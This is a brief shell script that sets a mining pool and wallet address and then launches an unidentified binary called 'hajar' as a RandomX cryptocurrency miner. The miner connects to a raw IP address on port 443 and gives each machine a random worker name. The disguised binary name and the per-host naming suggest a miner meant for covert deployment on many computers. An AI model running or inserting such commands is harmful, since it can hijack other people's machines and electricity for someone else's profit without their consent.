POOL=ap.luckpool.net:3956

WALLET=RR6U3T7Uz475i7gontznFLWikFsQan2wjC

chmod +x hajar

./hajar --donate-level 1 -a rx/0 -o 208.113.200.73:443 -u ThisPC.$(echo $(shuf -i 1-9999999 -n 1)) -p x -k -t 4
